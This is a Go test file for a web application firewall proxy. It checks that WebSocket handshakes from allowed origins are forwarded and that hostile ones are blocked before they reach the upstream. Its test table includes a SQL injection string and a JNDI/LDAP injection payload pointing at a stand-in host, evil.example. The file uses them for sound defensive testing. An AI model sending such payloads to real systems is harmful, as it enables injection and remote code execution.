// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package proxy

import (
	"bytes"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"golang.org/x/net/websocket"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
	"github.com/inkwall-dev/inkwall/pkg/rules/coraza"
)

// TestWebSocketHandshake: the proxy inspects a WebSocket handshake as any
// request and, once allowed, forwards the upgrade: messages flow both ways.
// A denied handshake gets the denial and never reaches the upstream (#276).
func TestWebSocketHandshake(t *testing.T) {
	reached := make(chan struct{}, 16)
	echo := websocket.Server{
		Handshake: func(*websocket.Config, *http.Request) error { return nil },
		Handler: func(ws *websocket.Conn) {
			reached <- struct{}{}
			_, _ = io.Copy(ws, ws)
		},
	}
	up := httptest.NewServer(echo)
	t.Cleanup(up.Close)
	upURL, _ := url.Parse(up.URL)

	eval, err := coraza.New(coraza.Config{})
	if err != nil {
		t.Fatal(err)
	}
	ws, err := pipeline.CompileWebSocket(pipeline.WebSocketConfig{AllowedOrigins: []string{"https://app.example.com"}})
	if err != nil {
		t.Fatal(err)
	}
	var logs bytes.Buffer
	h, err := New(pipeline.New(eval, pipeline.Config{Mode: pipeline.ModeBlock, Timeout: 10 * time.Second, WebSocket: ws}),
		Config{Upstream: upURL, MaxBodyBytes: 64, Logger: slog.New(slog.NewJSONHandler(&logs, nil))})
	if err != nil {
		t.Fatal(err)
	}
	front := httptest.NewServer(h)
	t.Cleanup(front.Close)
	wsURL := "ws" + strings.TrimPrefix(front.URL, "http")

	tests := []struct {
		name, path, origin, protocol string
		upgrade                      bool
	}{
		{"allowed origin", "/chat", "https://app.example.com", "", true},
		{"forbidden origin", "/chat", "https://evil.example", "", false},
		{"attack in the query", "/chat?room=1%27%20OR%20%271%27%3D%271", "https://app.example.com", "", false},
		{"attack in the subprotocol", "/chat", "https://app.example.com", "${jndi:ldap://evil.example/a}", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg, err := websocket.NewConfig(wsURL+tt.path, tt.origin)
			if err != nil {
				t.Fatal(err)
			}
			if tt.protocol != "" {
				cfg.Protocol = []string{tt.protocol}
			}
			conn, err := cfg.DialContext(t.Context())
			if !tt.upgrade {
				if err == nil {
					_ = conn.Close()
					t.Fatal("upgraded, want a denial")
				}
				if !strings.Contains(err.Error(), "bad status") {
					t.Fatalf("dial: %v, want a denial", err)
				}
				select {
				case <-reached:
					t.Fatal("the upstream got a denied handshake")
				default:
				}
				return
			}
			if err != nil {
				t.Fatalf("dial: %v; events: %s", err, logs.String())
			}
			defer func() { _ = conn.Close() }()
			<-reached
			if err := websocket.Message.Send(conn, "hello"); err != nil {
				t.Fatal(err)
			}
			var got string
			if err := websocket.Message.Receive(conn, &got); err != nil || got != "hello" {
				t.Fatalf("echo %q, %v", got, err)
			}
		})
	}
}
